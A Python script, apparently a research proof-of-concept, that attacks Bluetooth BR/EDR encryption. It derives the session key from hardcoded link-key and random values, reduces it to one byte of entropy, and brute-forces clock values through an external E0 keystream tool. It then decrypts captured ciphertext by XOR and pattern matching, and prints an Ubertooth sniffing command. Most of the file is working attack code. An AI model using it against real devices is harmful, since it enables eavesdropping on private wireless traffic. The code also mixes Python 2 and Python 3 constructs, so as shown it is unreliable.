"""
bf.py

"""

from es import *
from e1 import *
from e3 import *
from cts import *

from constants import *
# log.setLevel(logging.DEBUG)
log.setLevel(logging.INFO)

from subprocess import Popen, PIPE
from sys import exit
from itertools import count, imap


def pattern_match(patterns, out):
    assert type(patterns) == dict
    assert type(out) == bytearray

    matches = {}
    for p in patterns.keys():
        matches[p] = []
        FOUND = out.find(patterns[p])
        while FOUND != -1:
            matches[p].append(FOUND)
            FOUND = out.find(patterns[p], FOUND+len(patterns[p]))

    return matches


def xor_bytes_till_shorter(l, r):
    """xor bytes until the shortest bytearray is consumed."""
    assert type(l) == bytearray
    assert type(r) == bytearray

    i = 0
    if len(l) <= len(r):
        out = bytearray(len(l))
        for b in l:
            out[i] = b ^ r[i]
            i += 1
        assert len(out) == len(l)
    else:
        out = bytearray(len(r))
        for b in r:
            out[i] = b ^ l[i]
            i += 1
        assert len(out) == len(r)
    log.debug(f'xor_bytes_till_shorter out: {repr(out)}')
    return out


def clk_targets(clk_uint):
    """BitArray from MSb at index 0 to LSb."""
    assert type(clk_uint) == int

    clk = BitArray()
    clk.append(f'uint:32={clk_uint}')
    # log.info('clk_targets clkb     : {}'.format(clk.bin))
    clk_26_1 = clk[-27:-1]
    while len(clk_26_1) < 32:
        clk_26_1.prepend('0b0')
    assert len(clk_26_1) == 32
    # log.info('clk_targets clk26_1   : {}'.format(clk_26_1.bin))
    # log.info('clk_targets clk26_1 le: {}'.format(clk_26_1.uintle))
    # log.info('clk_targets clk26_1 be: {}'.format(clk_26_1.uintbe))

    return clk_26_1


if __name__ == "__main__":
    log.warning('attack Assuming FEC and whitening already computed by Ubertooth')

    # NOTE: nexus5 master, check if endianess is correct
    BTADDR_M    = bytearray.fromhex('ccfa0070dcb6')
    LAP_M_HEX       = '70dcb6'
    LAP_M       = bytearray.fromhex('70dcb6')
    UAP_M_HEX       = '00'
    UAP_M       = bytearray.fromhex('00')
    log.info(f'attack BTADDR_M : {repr(BTADDR_M)}')
    UT_STRING = f'sudo ubertooth-rx -l {LAP_M_HEX} -u {UAP_M_HEX}  -r nexus.pcap'
    log.info(f'attack start lmp and hci iblue monitors: {UT_STRING}')

    BTADDR_S    = bytearray.fromhex(MOTO_BTADD)
    log.info(f'attack BTADDR_S : {repr(BTADDR_S)}')

    # NOTE HCI: bthci_cmd.opcode == 0x040b
    Kl       = bytearray.fromhex('d5f20744c05d08601d28fa1dd79cdc27')
    log.info(f'attack Kl       : {repr(Kl)}')

    # NOTE LMP: btbrlmp.op == 11
    AU_RAND  = bytearray.fromhex('722e6ecd32ed43b7f3cdbdc2100ff6e0')
    log.info(f'attack AU_RAND  : {bytearray_to_hexstring(AU_RAND)}')
    SRES, ACO = e1(Kl, AU_RAND, BTADDR_S)
    R_SRES  = bytearray.fromhex('b0a3f41f')
    log.info(f'attack SRES     : {repr(SRES)}')
    log.info(f'attack R_SRES   : {repr(R_SRES)}')
    # NOTE LMP: btbrlmp.op == 12
    assert SRES == R_SRES
    log.info(f'attack ACO = COF: {repr(ACO)}')
    log.info(f'attack ACO = COF: {bytearray_to_hexstring(ACO)}')

    # NOTE LMP: btbrlmp.op == 17 master --> slave
    EN_RAND  = bytearray.fromhex('d72fb4217dcdc3145056ba488bea9076')
    log.info(f'attack EN_RAND  : {bytearray_to_hexstring(EN_RAND)}')

    # NOTE: COF = ACO
    Kc = e3(Kl, EN_RAND, ACO)
    log.info(f'attack Kc       : {repr(Kc)}')
    log.info(f'attack Kc       : {bytearray_to_hexstring(Kc)}')

    KC_PRIME_BYTES = 1
    Kc_prime = Kc_to_Kc_prime(Kc, KC_PRIME_BYTES)
    log.info(f'attack Kc_prime : {repr(Kc_prime)}, entropy: {KC_PRIME_BYTES} Byte')
    log.info(
        f'attack Kc_prime : {bytearray_to_hexstring(Kc_prime)}, entropy: {KC_PRIME_BYTES} Byte'
    )

    #######################################################

    KS_BYTES  = 400
    KS_OFFSET = 0

    CTS_INDEX = 6
    CT = CTS[CTS_INDEX]
    CT_BYTES = len(CT)
    if CT_BYTES == 0:
        log.error(f'attack CTS_INDEX {CTS_INDEX} contains no CT')
        exit(1)
    elif CT_BYTES > KS_BYTES:
        log.error(f'attack len CT {CT_BYTES} is greater than len ks')
        exit(1)

    # CLK_ORDER = 'CLK'  # MSB..LSB
    CLK_ORDER = 'RCLK'   # LSB..MSB

    # NOTE: 2 ** 26 = 67108864
    # NOTE: 2 ** 32 = 4294967296
    # clkn + offset from ut capture
    TARGET_CLK    = clk_targets(314606).uintbe
    BEGIN = TARGET_CLK - 10000
    END   = TARGET_CLK + 10000
    # BEGIN = 148775
    # BEGIN = 178775
    BEGIN = 198775
    END   = BEGIN + 20000

    #######################################################

    _ = raw_input(
        f'Make sure to make e0 with correct Kc_prime, and BTADDR_M\nBEGIN: {BEGIN}, END: {END}, KS_BYTES: {KS_BYTES}'
    )
    print('')

    filename = f'CT{CTS_INDEX}-{CLK_ORDER}-KS{KS_BYTES}-{BEGIN}-{END}.bf'
    with open(filename, mode="w") as fp:
        log.info(f'attack # BEGIN bruteforce : {filename}')
        fp.write(f'# BEGIN bruteforce: {filename}\n')
        log.info('attack {:10} {} CT  : {}'.format('',
            len(CT[:KS_BYTES]), bytearray_to_hexstring(CT[:KS_BYTES])))
        log.info('')
        log.info(f'PATTERNS: {repr(PATTERNS)}')
        fp.write(f'PATTERNS: {repr(PATTERNS)}\n')
        fp.write('CLK {:10} len: {} CT  : {}\n'.format('',
            len(CT[:KS_BYTES]), bytearray_to_hexstring(CT[:KS_BYTES])))
        fp.write('\n')

        for i in count(BEGIN):  # BEGIN..END
            if i % 50000 == 0:
                log.info('attack i: {:10}, BEGIN: {}, END: {}'.format(i, BEGIN, END))
            CLK_HEX = hex(i)[2:]
            if len(CLK_HEX) % 2 == 1:
                CLK_HEX = f'0{CLK_HEX}'
            # log.info('attack {:10} CLK_HEX: {}'.format(i, CLK_HEX))
            CLK = bytearray.fromhex(CLK_HEX)
            # NOTE: bytearray grows from right to left
            while len(CLK) < 4:
                CLK = '\x00' + CLK
            assert(len(CLK) == 4)
            # log.info('attack {:10} CLK_HEX: {}, CLK: {}'.format(i, CLK_HEX, repr(CLK)))
            fp.write('CLK: {:10}, CLK_HEX: {}, CLK: {}\n'.format(i, CLK_HEX, repr(CLK)))

            # NOTE: C init API
            # int KS_BYTES  = atoi(argv[1])
            # int KS_OFFSET = atoi(argv[2])
            # uint8_t a     = atoi(argv[3])
            # uint8_t b     = atoi(argv[4])
            # uint8_t c     = atoi(argv[5])
            # uint8_t d     = atoi(argv[6])
            if CLK_ORDER == 'CLK':
                ARGS = [ E0_IMPL_PATH, str(KS_BYTES), str(KS_OFFSET),
                    str(CLK[0]),  # CLK[0] is MSB
                    str(CLK[1]),
                    str(CLK[2]),
                    str(CLK[3]),
                ]
            elif CLK_ORDER == 'RCLK':
                ARGS = [ E0_IMPL_PATH, str(KS_BYTES), str(KS_OFFSET),
                    str(CLK[3]),  # CLK[3] is LSB
                    str(CLK[2]),
                    str(CLK[1]),
                    str(CLK[0]),
                ]
            else:
                log.error(f'attack unknown clock order: {CLK_ORDER}')
                exit(1)

            p = Popen(ARGS, stdout=PIPE)
            ks = bytearray.fromhex(p.stdout.readline())
            assert(len(ks) == KS_BYTES)

            # log.info('attack {:10} {} ks  : {}'.format(i, len(ks), bytearray_to_hexstring(ks)))
            fp.write('CLK: {:10} len: {} ks  : {}\n'.format(i, len(ks), bytearray_to_hexstring(ks)))

            for offset in range(KS_BYTES - CT_BYTES):

                out = xor_bytes_till_shorter(CT, ks[offset:])
                # log.info('attack {:10} {} out : {}'.format(i, len(out), bytearray_to_hexstring(out)))
                fp.write('CLK: {:10} off: {} len: {} out : {}\n'.format(i, offset, len(out),
                    bytearray_to_hexstring(out)))

                # NOTE: PATTERNS are in constants.py
                matches = pattern_match(PATTERNS, out)
                for match in matches.keys():
                    if len(matches[match]) > 0:
                        log.info('attack i: {:10}, off: {}, CLK_HEX: {}, MATCH {} {} at {}'.format(i,
                            offset, CLK_HEX, match, repr(PATTERNS[match]), matches[match]))
                        fp.write('CLK: {:10} off: {}, CLK_HEX: {}, MATCH {} {} at {}\n'.format(i,
                            offset, CLK_HEX, match, repr(PATTERNS[match]), matches[match]))

            fp.write('\n')

            if i == END:
                log.info(f'attack # END   bruteforce: {filename}')
                fp.write(f'# END   bruteforce: {filename}\n')
                break


